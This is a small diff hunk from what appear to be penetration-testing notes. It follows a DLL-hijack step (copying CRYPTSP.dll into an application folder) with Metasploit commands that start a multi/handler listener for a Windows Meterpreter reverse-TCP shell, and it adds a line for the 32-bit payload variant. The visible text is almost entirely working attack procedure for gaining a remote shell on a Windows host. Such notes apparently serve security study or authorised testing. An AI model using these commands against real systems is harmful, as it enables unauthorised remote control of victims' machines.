@@ -166,6 +166,7 @@ Copied CRYPTSP.dll to C:\AppFolder\
 Create listener in metastploit
 	use exploit/multi/handler
 	set payload windows/x64/meterpreter/reverse_tcp
+	set payload windows/meterpreter/reverse_tcp	#32bit 
 	set LHOST 192.168.1.184
 	set LPORT 4444
 	exploit
